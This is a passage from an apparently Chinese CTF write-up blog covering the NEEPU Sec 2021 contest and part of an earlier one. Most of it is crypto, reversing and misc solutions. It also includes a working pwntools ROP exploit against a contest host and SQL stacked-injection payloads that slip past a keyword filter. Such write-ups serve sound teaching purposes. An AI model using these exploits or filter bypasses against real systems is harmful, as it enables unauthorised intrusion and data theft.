p2) if e3.startswith(&#x27;8c582c6704f&#x27;) and e3.endswith(&#x27;153bd3313b84235ac&#x27;): c2 = xor_hex(p3, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c3)).hex()) e2 = xor_hex(c2, p1) #e2 = 6a20c55719151$$fccecb4$$$$$2a27c if e2.startswith(&#x27;6a20c55719151&#x27;) and &#x27;fccecb4&#x27; in e2 and e2.endswith(&#x27;2a27c&#x27;): c1 = xor_hex(p2, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c2)).hex()) e1 = &#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27; f1 = xor_hex(e1, c1) f2 = xor_hex(p1, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c1)).hex()) print(bytes.fromhex(f1)+bytes.fromhex(f2)) #hei_my_bro_this_is_flag_you_know ​ strange encrypt 学长学姐说这题应该不难吧？ 已知 fl4g 和640次AES加密后的 fl4g_enc，640个生成的key 按 extend_secret 二进制位选择前半段或后半段作为每轮AES使用的 key。 已知10位 secret 的前两位，对应扩展 extend_secret 为： 123456extend_secret:s1=[?,?,?,?,7]s2=[8,?,?,?,?]p1=(xxxx xxxx xxxx xxxx 0111)*16p2=(1000 xxxx xxxx xxxx xxxx)*16ex=p1+p2 采用中间人攻击(MITM)，枚举 s1 中未知4位得到fl4g AES加密32次的可能值（16^4=65536），再枚举 s2 中未知4位得到 fl4g_enc AES解密32次的可能值（16^4=65536），两组可能值中相等的即为所求。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from Crypto.Util.strxor import *from Crypto.Cipher import AESimport hashlibinit_key = b&#x27;look_at_here!you_may_need_it!!&#x27;fl4g = b&#x27;fl4g&#123;I_HaTe_The_DaMn_FaKe_FlAg&#125;&#x27;fl4g_enc = &#x27;4b559c0adaf6c14584aea729ed3c544cee8e3ea8cf1d2dc67d620e59c1053976&#x27;flag_enc = &#x27;ed0a40ac74c25e549a92fb90eb07b86ba3de0001a014c2e31c5e0dc6ad8a1fd8cdad1ea856f6b47b4e960bdeb6a447fb&#x27;def pad(s): return s + (16 - (len(s) % 16)) * b&#x27;\\x11&#x27;def genKeys(init): keys = [] for _ in range(640): key = hashlib.md5(init).hexdigest() keys.append(key) init = key.encode() return keys def extend(s): s1 = [ int(s[2 * i], 16) for i in range(len(s)//2)] s2 = [ int(s[2 * i + 1], 16) for i in range(len(s)//2)][::-1] part1 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s1)) * 16 part2 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s2)) * 16 return part1 + part2keys = genKeys(init_key)def encrypt(msg): for i,k in enumerate(keys): b = int(ex[i]) &amp; 1 key = k[ b * 16 : (b + 1) * 16] aes = AES.new(key, AES.MODE_ECB) msg = aes.encrypt(msg) return msgdef decrypt(msg): for i in range(640-1, -1, -1): b = int(ex[i]) &amp; 1 key = keys[i][b*16:(b+1)*16] aes = AES.new(key, AES.MODE_ECB) msg = aes.decrypt(msg) return msg def half_enc(msg, ex): for i in range(320): b = int(ex[i]) &amp; 1 key = keys[i][ b * 16 : (b + 1) * 16] aes = AES.new(key, AES.MODE_ECB) msg = aes.encrypt(msg) return msg def half_dec(msg, ex): for i in range(640-1, 320-1, -1): b = int(ex[i-320]) &amp; 1 key = keys[i][b*16:(b+1)*16] aes = AES.new(key, AES.MODE_ECB) msg = aes.decrypt(msg) return msg mid = dict()for s11 in range(16): for s12 in range(16): for s13 in range(16): for s14 in range(16): s1 = [7, s11, s12, s13, s14] part1 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s1)) * 16 m = half_enc(pad(fl4g), part1).hex() mid.update(&#123;m: s1&#125;)print(len(mid)) for s22 in range(16): for s23 in range(16): for s24 in range(16): for s25 in range(16): s2 = [s22, s23, s24, s25, 8] part2 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s2)) * 16 m = half_dec(bytes.fromhex(fl4g_enc), part2).hex() if m in mid: s1 = mid[m] print(s1) print(s2) #s1 = [7, 15, 9, 11, 15]#s2 = [8, 4, 13, 15, 8]#secret = 78ff9db4f8secret = &#x27;78ff9db4f8&#x27;ex = extend(secret)print(encrypt(pad(fl4g)).hex() == fl4g_enc)print(decrypt(bytes.fromhex(fl4g_enc)) == pad(fl4g))print(decrypt(bytes.fromhex(flag_enc)))#b&#x27;Dozerctf&#123;thanks_to_Seniors_and_Sisters&#125;\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11&#x27; ​ Rei wanna 大晚上特供版 晚上域渗透环境还是老是崩，没事儿来个i wanna 泄泄火，玩就是了 链接：https://pan.baidu.com/s/14aBNQg90jLDEOOLWhkqrNQ 提取码：4s8s GameMaker开发的著名I Wanna系列小游戏。 用 GM8Decompiler 把exe恢复为gmk文件，再用 Gmk-Splitter 提取gmk文件中游戏素材，在图片堆里找到包含flag的一张图片。 ​ PwnPwnPwnPwn 貌似又是原题，锤爆这个出题人 nc 1.14.160.21 20001 简单ret2text64。 123456789101112from pwn import *r = remote(&#x27;1.14.160.21&#x27;, 20001)backdoor = 0x401176binsh1 = 0x401199binsh2 = 0x4011f9p_rdi = 0x401313p_rsi_r15 = 0x401311pay = &#x27;A&#x27; * 0x78 + p64(p_rdi) + p64(0xB16BAD) + p64(binsh1) + p64(p_rsi_r15) + p64(0xFEE1DEAD) + p64(0) + p64(p_rdi) + p64(0xBADF00D) + p64(binsh2) + p64(backdoor)r.sendline(pay)r.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"NEEPU Sec 2021公开赛","slug":"match-NEEPU-Sec-2021公开赛","date":"2021-05-24T11:40:39.000Z","updated":"2021-05-24T17:48:45.003Z","comments":true,"path":"2021/05/24/match-NEEPU-Sec-2021公开赛/","link":"","permalink":"https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"","text":"​ 东北电力大学校赛，Web综合程度高，Crypto太少了。 Rank: 3 NoobLinux入门 Linux基本指令 ls/dir: 访问当前目录 cat: 获取当前文件内容 grep: 匹配字符串 *: 匹配一个或多个字符 ?: 匹配一个字符 /: 根目录 hint: Linux的系统配置文件主要放在哪里? Linux命令大考察。 ls -al 当前目录发现 hint.txt cat hint.txt 查看内容：尝试访问根目录 ls -al / 根目录发现flag文件 cat /flag 查看内容：可以尝试grep 在根目录逐个文件夹用grep命令试，在/etc下发现关键字： grep -r -n &quot;Neepu&#123;&quot; /etc 结果： /etc/neepu.conf:1:Neepu&#123;f782fecc-2e63-4819-8dd4-f2b2584c85b0&#125; ​ 最强大脑 不会吧，不会吧，不会有人不喜欢算算术吧… 10s限时算数题，利用python里的requests包处理就好： 12345678910111213141516171819202122import requestsurl = &#x27;http://neepusec.club:18495/&#x27;s = requests.Session()r = s.get(url)html = r.textstart = html.index(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+len(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+8end = start+html[start:].index(&#x27;&amp;nbsp=&amp;nbsp?&#x27;)for i in range(100): cal = html[start:end].replace(&#x27;&amp;nbsp&#x27;,&#x27;&#x27;) r = s.post(url,data=&#123;&#x27;answer&#x27;:str(eval(cal))&#125;) if &#x27;success&#x27; in r.text: print((i+1,&#x27;success&#x27;)) if &#x27;Neepu&#123;&#x27; in r.text: print(i+1) print(r.text) break html = r.text start = html.index(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+len(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+8 end = start+html[start:].index(&#x27;&amp;nbsp=&amp;nbsp?&#x27;) ​ 随便注2.0 如果我告诉你网上有原题，你能做的出来吗? 百度/谷歌搜索: [强网杯 2019]随便注 强网杯2019 随便注原题魔改，堆叠注入，照着来。 1&#39; union select 1,2,database()# 得到过滤规则 return preg_match(&quot;/select|update|delete|drop|insert|where|rename|set|handler|char|\\*| | |\\./i&quot;,$inject); 空格用%0a代替，尝试堆叠注入： 0&#39;;show%0adatabases;# 得到数据库名：ctftraining, information_schema, mysql, performance_schema, supersqli, test 0&#39;;show%0atables;# 得到表名：@Neepu2021招新赛, words 0&#39;;desc%0a`@Neepu2021招新赛`;# 得到列名：flag, NO 原题有重命名法和预处理法可得flag，这里rename和set被禁，可用prepare 预处理+execute 执行的方法，构造select flag from `@Neepu2021招新赛` 16进制字符串，代入预处理语句拿flag： 1&#39;;prepare%0axxx%0afrom%0a0x73656c65637420666c61672066726f6d2060404e6565707532303231e68b9be696b0e8b59b60;execute%0axxx;# ​ Webremote_table 这真的是远程桌面吗?或许吧… 翻一圈源码，在notfound.html找到flag。 ​ LOVE_DEATH&amp;ROBOTS Beauty and danger coexist, and the magnificence, weirdness, and extraordinary view of the world often lie in peril, and human beings are rare, so people who do not have aspirations cannot come. 根据标题ROBOTS，容易想到robots.txt，访问发现/n33pvfl4g.php，再访问n33pvfl4g.php得flag。 ​ Misc15 Puzzle! You can do it! 手拼就是了，拼完有flag。 ​ 龙会说话？ 龙会聊天吗？ 第一层，一个文件 dragon 和一个加密压缩包 dragon’s talk.rar。 010editor查看 dragon，发现尾部49454E44AE426082是png文件尾，查找文件头89504E47，分离出png图片： 找到龙语解码工具，解出youseethedragon为rar密码。 第二层，一个 dragon’s talk.wav 文件。 用audacity未发现什么信息，尝试LSB隐写，用Silenteye无密码得到隐藏文件flag.txt。 ​ CryptoRSA Just RSA! 1234567891011121314151617181920212223242526272829303132from Crypto.Util.number import *from sympy import nextprimeimport gmpy2import randomdef encode (p1,p2,e): not_hint = (p1 + 1) * (p2 + 1) S = gmpy2.invert(e, not_hint) not_p = S%(p1+1) return not_pflag = b&#x27;Neepu&#123;********************&#125;&#x27;flag = bytes_to_long(flag)p = getPrime(512)q = getPrime(512)n = p*qe = nextprime(random.randint(1,1000))d = gmpy2.invert(e, (p-1)*(q-1))c = pow(flag, e, n)print(c)print(n)m = encode(p, q, e)c1 = pow(m, 7, n)c2 = pow(m+e, 7, n)print(c1)print(c2)&#x27;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671&#x27;&#x27;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543&#x27;&#x27;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892&#x27;&#x27;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119&#x27; 两部分： 第一部分 $n=pq,c=\\text{flag}^e \\bmod n$， 第二部分 $m=\\text{enc}(p,q,e),c_1=m^7 \\bmod n,c_2=(m+e)^7 \\bmod n$。 先解第二部分，利用Related Message Attack求解 $m$，由于 $e$ 未知且 $e&lt;1010$，爆破 $e$ 求出 $m$： 12345678910111213141516171819202122232425import binasciidef attack(c1, c2, n, e): PR.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = (x)^7 - c1 g2 = (x+e)^7 - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]c1 = 10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892c2 = 46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119n = 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543for e in range(1,1000): m = attack(c1, c2, n, e) try: if pow(m,7,n) == c1: print((e,m)) except: pass#结果：(71, 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859)#e = 71#m = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859 又 $m=\\text{enc}(p,q,e)$，即 $eS=ed \\equiv 1 \\pmod {(p+1)(q+1)},dp=S \\bmod (p+1)=d \\bmod (p+1)$， 由于 $e \\cdot dp \\equiv e \\cdot d \\equiv 1 \\pmod {(p+1)}$，有 $e \\cdot dp-1=k \\cdot (p+1)$， 比较 $e \\cdot dp$ 与 $p$ 比特位数相近，故 $k$ 值不大， 爆破 $k$，当同时满足 $(e \\cdot dp-1) \\bmod k =0$ 和 $n \\bmod \\Big(\\cfrac{e \\cdot dp-1}{k}-1\\Big)$ 时，$n$ 成功分解。 1234567891011n = 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543dp = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859e = 71c = 78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671for k in range(1,10000): if (e*dp-1)%k == 0: p = (e*dp-1)//k-1 if n%p == 0: q = n//p print((k,p,q)) 最后常规RSA求得flag。 ​ AES 简单的AES 1234567891011121314151617181920212223from Crypto.Cipher import AESimport osfrom Crypto.Util.number import *flag = os.urandom(18)flag_enc = os.urandom(45)pad = b&#x27;a&#x27; * 12 + b&#x27;Neepu&#123;&#x27;flag_enc = pad+flag_enc+b&#x27;&#125;&#x27;masg1 = flag_enc[0:32]masg2 = flag_enc[32: ]m = bytes_to_long(masg1)^bytes_to_long(masg2)key = os.urandom(2)*16iv = masg2[16:][:16]print(bytes_to_long(key)^bytes_to_long(iv))aes = AES.new(key,AES.MODE_CBC,iv)enc_flag = aes.encrypt(long_to_bytes(m))print(enc_flag)&#x27;&#x27;&#x27;111074535590201916919246051309547040927554959486196038152130336189953949145068b&#x27;\\xd8\\x83\\xfd\\x89\\xc3+\\x11\\xb8g\\xd2\\xf5k\\xeeU\\x88\\xb5\\xde\\x8bq\\x9bC\\xab\\xe3K2R&lt;\\xaa\\xbc\\x92H\\x19&#x27;&#x27;&#x27;&#x27; 先看flag_enc由64字符构成，已知前18字符 aaaaaaaaaaaaNeepu&#123; 和后1字符 &#125; 。 拆半分别为前32字符 masg1 和后32字符 masg2，异或值 m = masg1^masg2， 通过AES-CBC加密，key形如 xyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxy，iv为 masg2 后16字符，已知 key^iv。 从key入手，key只有两位未知，爆破key值，同时得到iv值，利用iv值16位和最后1位字符为&#125;，得到key和iv值： 1234567891011tmp=111074535590201916919246051309547040927554959486196038152130336189953949145068for i in range(256): for j in range(256): key = bytes([i,j])*16 iv = long_to_bytes(tmp^bytes_to_long(key)) if len(iv) == 16 and iv[-1] == ord(&#x27;&#125;&#x27;): print(iv) print(key)#iv: b&#x27;fefcsukobhmtfhb&#125;&#x27;#key: b&#x27;\\xf5\\x91&#x27;*16 由key和iv值+密文 enc 解出 m。 此时，前32字符 masg1 已知前16字符aaaaaaaaaaaaNeep，后32字符 masg2 已知后16字符 fefcsukobhmtfhb&#125;，根据 m = masg1^masg2 分别异或得到另一半： 1234567891011iv = b&#x27;fefcsukobhmtfhb&#125;&#x27;key = b&#x27;\\xf5\\x91&#x27;*16aes = AES.new(key,AES.MODE_CBC,iv)m = aes.decrypt(enc)print(m)masg1 = (b&#x27;a&#x27;*12 + b&#x27;Neep&#x27;) + long_to_bytes(bytes_to_long(iv)^bytes_to_long(m[16:]))masg2 = long_to_bytes(bytes_to_long(b&#x27;a&#x27;*12+b&#x27;Neep&#x27;)^bytes_to_long(m[:16])) + ivflag_enc = masg1 + masg2#aaaaaaaaaaaaNeepu&#123;qszeftwdr-thuilpyji-ijlmukoescfefcsukobhmtfhb&#125; 发现代码里 flag 和 flag_enc 无直接关联，观察 flag_enc为键盘加密，解密得 flag：Neepu&#123;are-you-kidding&#125;。 ​ REOLLEH !ni ngis ER laeR hint: 师傅们如果做出来了请将flag框架改为Neepu{}，给师傅们带来不便，非常抱歉 IDA，main()： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849_main();strcpy((char *)v20, &quot;416:99A:77&quot;); //字符串v20 = 416:99A:77v20[6] = 0;LOBYTE(v20[7]) = 0;memset(v14, 0, sizeof(v14));v14[0] = 1;v14[1] = 1;for ( i = 2; i &lt;= 19; ++i ) //v14 = 长度20的斐波那契数列 v14[i] = v14[i - 2] + v14[i - 1];for ( i = 0; i &lt;= 9; ++i ) //v20按 (斐波那契数列值 &amp; 0xF) 移位，存入v4 = 3047414550 *(&amp;v4 + i) = *((char *)v20 + i) - (v14[i] &amp; 0xF);v17[0] = &#x27;OLLEH&#x27;; //v17 = HELLOv17[1] = 0i64;v18 = 0;strcpy(v15, &quot;flag&#123;world_Vjea&#125;&quot;); //v15 = flag&#123;world_Vjea&#125;for ( j = 0; j &lt;= 4; ++j ) v16[j] = *((_BYTE *)v17 + j); //v16[0:5] = v17[0:5] = HELLOfor ( j = 5; j &lt;= 9; ++j ) v16[j] = v15[j]; //v16[5:10] = v15[5:10] = worldputs(&quot;Welcome to the 2021 NEEPUCTF&quot;);puts(&quot;Now you can enjoy it&quot;);puts(&quot;Please input right number:&quot;);scanf(&quot;%s&quot;, Str);v21 = strlen(Str);if ( v21 != 10 )&#123; puts(&quot;Try again&quot;); exit(0);&#125;if ( v4 == Str[0] &amp;&amp; v5 == Str[1] &amp;&amp; v6 == Str[2] &amp;&amp; v7 == Str[3] &amp;&amp; v8 == Str[4] &amp;&amp; v9 == Str[5] &amp;&amp; v10 == Str[6] &amp;&amp; v11 == Str[7] &amp;&amp; v12 == Str[8] &amp;&amp; v13 == Str[9] ) //Str == v4&#123; printf(&quot;OK,FLAG is NEEPU&#123;MD5&#123;%s%d%d%d%d%d&#125;&#125;&quot;, v16, v4, v5, v6, v7, v8); getchar();&#125;else&#123; puts(&quot;byebye&quot;);&#125;system(&quot;pause&quot;);return 0; 按代码逻辑，拼接得 v16 = HeLLOworld，v4~v8 = 30474，由于 v4~v8 格式化输出为 %d，转化为对应ASCII值。 flag得到：Neepu&#123;md5(HeLLOworldworld5148525552)&#125; ​ ez_re ezRE, wryyyyy~ 两个文件，easyre.dll 和 easyre.exe。 exeinfope查看easyre.dll，发现是.NET程序，上ILSpy： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// retest.Programinternal class Program&#123; private static void Main(string[] args) &#123; string text = &quot;mT0b&quot;; string text2 = &quot;D&#123;0S&quot;; string text3 = &quot;Dg9E&quot;; string text4 = &quot;OD_&#125;&quot;; char[] array = new char[4]; char[] array2 = new char[4]; char[] array3 = new char[4]; char[] array4 = new char[4]; array[0] = text.get_Chars(0); array[1] = text2.get_Chars(0); array[2] = text3.get_Chars(0); array[3] = text4.get_Chars(0); array2[0] = text.get_Chars(1); array2[1] = text2.get_Chars(1); array2[2] = text3.get_Chars(1); array2[3] = text4.get_Chars(1); array3[0] = text.get_Chars(2); array3[1] = text2.get_Chars(2); array3[2] = text3.get_Chars(2); array3[3] = text4.get_Chars(2); array4[0] = text.get_Chars(2); array4[1] = text2.get_Chars(2); array4[2] = text3.get_Chars(2); array4[3] = text4.get_Chars(2); Encrypt1(array); Encrypt1(array2); Encrypt1(array3); Encrypt1(array4); &#125; public static void Encrypt1(char[] string1) &#123; int num = string1.Length; for (int i = 0; i &lt; num; i++) &#123; if (string1[i] &gt;= &#x27;a&#x27; &amp;&amp; string1[i] &lt;= &#x27;z&#x27;) &#123; if (string1[i] &gt;= &#x27;a&#x27; &amp;&amp; string1[i] &lt;= &#x27;y&#x27;) &#123; string1[i] = (char)(string1[i] - 31); &#125; else &#123; string1[i] = &#x27;A&#x27;; &#125; &#125; else if (string1[i] &gt;= &#x27;A&#x27; &amp;&amp; string1[i] &lt;= &#x27;Z&#x27;) &#123; if (string1[i] &gt;= &#x27;A&#x27; &amp;&amp; string1[i] &lt;= &#x27;Y&#x27;) &#123; string1[i] = (char)(string1[i] + 33); &#125; else &#123; string1[i] = &#x27;a&#x27;; &#125; &#125; else if (string1[i] &gt;= &#x27;0&#x27; &amp;&amp; string1[i] &lt;= &#x27;9&#x27;) &#123; if (string1[i] == &#x27;9&#x27;) &#123; string1[i] = &#x27;0&#x27;; &#125; else &#123; string1[i] = (char)(string1[i] + 1); &#125; &#125; &#125; &#125;&#125; 看Main()，按逻辑得 array1~4 分别为 mDDO,T&#123;gD,009_,bSE&#125;，再看Encrypt1()，a-z移位-31，A-Z移位33，0-9 移位1，操作后得 Neepu&#123;He110_Ctf&#125;。 ​ login login in please :) login文件夹里包含usrs_info2.pickle序列化文件，确定是python程序。 pyinstxtractor解包exe为pyc，再uncompyle6反编译retest2.pyc为python源码，找到flag。 ​ ppap 最近小猫爱上了闯关 查壳发现upx壳，工具脱壳。 IDA，main()： 123456789101112131415161718192021222324252627282930313233343536 sub_40DA40();LABEL_2: puts(&quot;ppap&quot;); puts(&quot;The cat is very cute, do you like it?&quot;); puts(&quot;My cat is lost, help me&quot;); puts(&quot;please input your cat&#x27;s name&#x27;&quot;); puts(&quot;tell me 1+2=?&quot;); scanf(&quot;%256s\\n&quot;, Str); //输入字符串 v3 = strlen(Str); v11 = (const char *)sub_401500(Str, v3); //v11 = 输入字符串的base64编码（自定义码表） for ( i = 0; ; ++i ) &#123; v4 = i; if ( v4 &gt;= strlen(v11) ) break; v7[i] = v11[i]; //v7 = v11 &#125; strcpy(v8, &quot;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&quot;); //v8 = WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc memset(v9, 0, sizeof(v9)); sub_40167D(v7); //对v7做第一次处理，函数sub_40167D() sub_401746(v7); //对v7做第二次处理，函数sub_401746() for ( j = 0; ; ++j ) &#123; v5 = j; if ( v5 &gt;= strlen(v7) ) break; if ( v7[j] != v8[j] ) //比较v7 == v8？ &#123; printf(&quot;ppap&quot;); goto LABEL_2; &#125; &#125; puts(&quot;Yes, you are right&quot;); system(&quot;pause&quot;); return 0; 函数 sub_40167D()： 123456789101112131415161718192021char *__cdecl sub_40167D(char *Str)&#123; size_t i; // [esp+1Ch] [ebp-Ch] strlen(Str); for ( i = 0; i &lt; strlen(Str); ++i ) &#123; if ( Str[i] &lt;= 64 || Str[i] &gt; 90 ) &#123; if ( Str[i] &lt;= 96 || Str[i] &gt; 122 ) Str[i] = Str[i]; else Str[i] -= 32; //96&lt;字符ascii值&lt;=122，字符移位 &#125; else &#123; Str[i] += 32; //64&lt;字符ascii值&lt;=90，字符移位 &#125; &#125; return Str;&#125; 函数 sub_401746()： 123456789101112131415161718char *__cdecl sub_401746(char *Str)&#123; size_t i; // [esp+1Ch] [ebp-Ch] for ( i = 0; i &lt; strlen(Str); ++i ) &#123; if ( Str[i] &lt;= 64 || Str[i] &gt; 90 ) &#123; if ( Str[i] &gt; 96 &amp;&amp; Str[i] &lt;= 122 ) Str[i] = (Str[i] - 97 + 3) % 26 + 97; //96&lt;字符ascii值&lt;=122，字符循环移位 &#125; else &#123; Str[i] = (Str[i] - 65 + 3) % 26 + 65; //64&lt;字符ascii值&lt;=90，字符循环移位 &#125; &#125; return Str;&#125; 将 v8 字符串先按函数 sub_401746()还原，再按函数 sub_40167D()还原： 123456789101112131415161718192021222324252627282930313233343536s=&#x27;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&#x27;s=list(s.encode())t=[-1]*len(s)tt=[-1]*len(s)for i in range(len(s)): for j in range(32,128): c=j if c&lt;=64 or c&gt;90: if c&gt;96 and c&lt;=122: c=(c-97+3)%26+97 else: c=(c-65+3)%26+65 if c==s[i]: t[i]=j break for i in range(len(t)): for j in range(32,128): c=j if c&lt;=64 or c&gt;90: if c&lt;=96 or c&gt;122: c=c else: c-=32 else: c+=32 if c==t[i]: tt[i]=j break print(bytes(tt))#解密得密文：tCvB2hvXuS77mvZQytf5wwfKzRZezvZUmweMxSN71BZJyub54wfZ#自定义码表：a-z0-9A-Z+/= 解自定义码表下的base64得flag。 ​ ez Do you like basketball? IDA，main()： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081sub_40E3F0();puts(&quot;Do you like basketball?&quot;);scanf(&quot;%s&quot;, Source); //输入字符串Sourcestrcpy(Destination, Source); //Dest = Sourcememset(v7, 0, sizeof(v7));memset(v8, 0, 0x80u);sub_40235D(Source, v7, &quot;flag&#123;Would_you_like_basketball?&#125;&quot;); //函数sub_40235D(Source,out,key) （RC4+base64）v28 = 32;v24[0] = 2;v24[1] = 2;v24[2] = 3;v24[3] = 4; //v24 = [2,2,3,4]puts(&quot;please input your lucky number&quot;);for ( i = 0; i &lt;= 1; ++i ) scanf(&quot;%d&quot;, &amp;v25 + i); //输入v25,v26for ( j = 0; j &lt;= 1; ++j ) scanf(&quot;%d&quot;, &amp;v22 + j); //输入v22,v23for ( k = 0; k &lt;= 1; ++k ) scanf(&quot;%d&quot;, &amp;v20 + k); //输入v20,v21for ( l = 0; l &lt;= 1; ++l ) scanf(&quot;%d&quot;, &amp;v18 + l); //输入v18,v19v4[0] = v25;v4[1] = v26;v4[2] = v22;v4[3] = v23;v4[4] = v20;v4[5] = v21;v4[6] = v18;v4[7] = v19; //v4 = [v25,v26,v22,v23,v20,v21,v18,v19]for ( m = 0; m &lt;= 7; ++m ) //对v4冒泡排序（升序）&#123; for ( n = 7; n &gt; m; --n ) &#123; if ( v4[n] &lt; v4[n - 1] ) &#123; v27 = v4[n]; v4[n] = v4[n - 1]; v4[n - 1] = v27; &#125; &#125;&#125;sub_40152F(&amp;v25, v24); //函数sub_40152F() （TEA加密）sub_40152F(&amp;v22, v24); //函数sub_40152F() （TEA加密）sub_4015FD(v28, &amp;v20, v24); //函数sub_4015FD() （XTEA加密）sub_4015FD(v28, &amp;v18, v24); //函数sub_4015FD() （XTEA加密）memset(v9, 0, sizeof(v9));v9[0] = 81; //v9v9[1] = 116;......v9[46] = 7;v9[47] = 8;v16 = -1621115832; //v10~v17，8个hexv17 = -984516975;v14 = 616429839;v15 = 807110888;v12 = -1837822886;v13 = -1596355058;v10 = -1915738221;v11 = 1331005540;if ( v25 != -1621115832 //v25,v26,v22,v23,v20,v21,v18,v19 == v10~v17 || v26 != v17 || v14 != v22 || v15 != v23 || v12 != v20 || v13 != v21 || v10 != v18 || v11 != v19 )&#123; printf(&quot;you are wrong&quot;); exit(0);&#125;for ( ii = 0; ii &lt;= 47; ++ii ) *(_DWORD *)&amp;v8[4 * ii + 128] = v4[ii % 8] ^ v7[ii]; //v8 = v4^v7 for ( jj = 0; jj &lt;= 47; ++jj )&#123; if ( v9[jj] != *(_DWORD *)&amp;v8[4 * jj + 128] ) //v9 == v8？ exit(0);&#125;printf(&quot;Right,FLAG is Neepu&#123;%s&#125;\\n&quot;, Destination);system(&quot;PAUSE&quot;);return 0; 函数 sub_40235D(Source,out,key)： 123456789101112131415161718192021222324252627282930void __cdecl sub_40235D(char *Str, void *a2, char *a3)&#123; void *Src; // [esp+1Ch] [ebp-1Ch] BYREF size_t Size; // [esp+20h] [ebp-18h] BYREF void *Block; // [esp+24h] [ebp-14h] size_t v6; // [esp+28h] [ebp-10h] size_t v7; // [esp+2Ch] [ebp-Ch] if ( Str &amp;&amp; a2 &amp;&amp; a3 ) &#123; v7 = strlen(Str); v6 = strlen(a3); Block = (void *)sub_418710(v7 + 1); //初始化Block memcpy(Block, Str, v7 + 1); sub_401E22(Block, v7, a3, v6); //RC4加密，Block = RC4(Str,key) Size = 0; Src = 0; sub_4020DE(Block, v7, (int)&amp;Src, (int)&amp;Size); //Src = Block的base64编码（自定义码表） if ( Src ) &#123; memcpy(a2, Src, Size); //a2 = Src *((_BYTE *)a2 + Size) = 0; if ( Src ) j_j_free(Src); Src = 0; &#125; if ( Block ) j_j_free(Block); &#125;&#125; 函数 sub_40152F()： 12345678910111213141516171819202122unsigned int __cdecl sub_40152F(unsigned int *a1, _DWORD *a2) //TEA加密算法&#123; unsigned int result; // eax unsigned int i; // [esp+20h] [ebp-10h] int v4; // [esp+24h] [ebp-Ch] unsigned int v5; // [esp+28h] [ebp-8h] unsigned int v6; // [esp+2Ch] 